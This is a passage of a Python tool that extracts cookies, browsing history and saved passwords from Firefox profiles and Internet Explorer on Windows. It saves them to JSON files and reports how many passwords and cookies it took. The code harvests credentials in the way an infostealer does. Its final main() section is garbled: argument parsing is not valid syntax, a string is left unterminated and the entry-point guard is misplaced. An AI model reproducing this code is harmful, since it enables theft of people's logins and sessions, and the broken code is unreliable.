                            print(f"  Processing profile: {profile}")
                            
                            try:
                                cookies = self.extract_firefox_cookies(profile_path)
                                if cookies:
                                    browser_data["cookies"][profile] = cookies
                                    self.extraction_stats["total_cookies"] += len(cookies)
                            except Exception as e:
                                logger.error(f"Cookie extraction failed for {profile}: {e}")
                                self.errors.append(f"{config['name']} {profile} cookies: {e}")
                            
                            try:
                                history = self.extract_firefox_history(profile_path)
                                if history:
                                    browser_data["history"][profile] = history
                                    self.extraction_stats["total_history"] += len(history)
                            except Exception as e:
                                logger.error(f"History extraction failed for {profile}: {e}")
                                self.errors.append(f"{config['name']} {profile} history: {e}")
                            
                            try:
                                passwords = self.extract_firefox_passwords(profile_path, master_password)
                                if passwords:
                                    browser_data["passwords"][profile] = passwords
                                    self.extraction_stats["total_passwords"] += len(passwords)
                            except Exception as e:
                                logger.error(f"Password extraction failed for {profile}: {e}")
                                self.errors.append(f"{config['name']} {profile} passwords: {e}")
                    
                    elif config["type"] == BrowserType.IE:
                        try:
                            history = self.extract_ie_history()
                            if history:
                                browser_data["history"]["default"] = history
                                self.extraction_stats["total_history"] += len(history)
                        except Exception as e:
                            logger.error(f"IE history extraction failed: {e}")
                            self.errors.append(f"IE history extraction: {e}")
                    
                    # Save browser-specific data
                    all_data["browsers"][browser_id] = browser_data
                    self.save_browser_data(config["name"], browser_data)
                    self.extraction_stats["browsers_processed"] += 1
                    
                    print(f"  {Fore.GREEN}✓ Completed {config['name']}{Style.RESET_ALL}")
                
                except Exception as e:
                    logger.error(f"Failed to extract data from {config['name']}: {e}")
                    self.errors.append(f"{config['name']} general error: {e}")
                    self.extraction_stats["errors"] += 1
                
                pbar.update(1)
        
        # Save consolidated data
        try:
            with open("all_browser_data.json", "w", encoding="utf-8") as f:
                json.dump(all_data, f, indent=2, default=str)
            print(f"\n{Fore.GREEN}✓ Saved consolidated data to all_browser_data.json{Style.RESET_ALL}")
        except Exception as e:
            logger.error(f"Failed to save consolidated data: {e}")
            self.errors.append(f"Failed to save consolidated data: {e}")
        
        # Update summary with errors
        all_data["summary"]["errors"] = self.errors
        
        return all_data
    
    def print_summary(self):
        print(f"{Fore.GREEN}Browsers processed: {self.extraction_stats['browsers_processed']}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}Total cookies extracted: {self.extraction_stats['total_cookies']}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}Total history entries: {self.extraction_stats['total_history']}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}Total passwords extracted: {self.extraction_stats['total_passwords']}{Style.RESET_ALL}")
        
        print(f"  - all_browser_data.json (consolidated data)")
        print(f"  - [browser_name]_cookies.json (per-browser cookies)")
        print(f"  - [browser_name]_history.json (per-browser history)")
        print(f"  - [browser_name]_passwords.json (per-browser passwords)")
        print(f"  - browser_extractor.log (detailed log)")
    
    @staticmethod
    def chrome_time_to_datetime(chrome_time):
        """Convert Chrome timestamp (microseconds since 1601-01-01) to datetime"""
        try:
            return datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)
        except:
            return None
    
    @staticmethod
    def firefox_time_to_datetime(firefox_time):
        """Convert Firefox timestamp (microseconds since 1970-01-01) to datetime"""
        try:
            return datetime(1970, 1, 1) + timedelta(microseconds=firefox_time)
        except:
            return None

def main():
  args = --custom-paths verbose
        logging.getLogger().setLevel(logging.DEBUG)
    
    custom_paths = {}
    if args.custom_paths and os.path.exists(args.custom_paths):
        try:
            with open(args.custom_paths, 'r') as f:
                custom_paths = json.load(f)
        except Exception as e:
            print(f"Failed to load custom paths: {e}")
    
    if platform.system() != "Windows":
        print(f"{Fore.RED}ERROR: This script is Windows-only.
        return
    
    if __name__ == "__main__":
        extractor = BrowserDataExtractor(custom_paths)
        all_data = extractor.extract_all_browser_data(args.master_password)
        extractor.print_summary()
